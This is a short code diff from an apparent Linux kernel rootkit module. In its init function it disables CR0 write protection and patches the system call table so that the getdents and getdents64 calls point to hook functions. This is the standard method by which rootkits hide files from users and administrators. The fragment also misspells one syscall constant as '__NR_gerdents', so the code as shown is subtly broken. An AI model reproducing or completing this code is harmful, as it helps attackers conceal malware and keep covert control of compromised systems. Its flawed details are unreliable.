@@ -144,11 +144,13 @@ static int __init rootkit_init(void)
   def_cr0(cr0 & ~0x00010000);
 
   unsigned long *__sysc = ret_sysc_table();
-  return __sysc;
   
   orig_getdents64 = (t_syscall)__sysc[__NR_getdents64];
   orig_getdents = (t_syscall)__sysc[__NR_getdents];
 
+  __sysc[__NR_getdents64] = (unsigned long)hook_getdents64;
+  __sysc[__NR_gerdents] = (unsigned long)hook_getdents;
+	
   def_cr0(cr0);
 
   return 0;
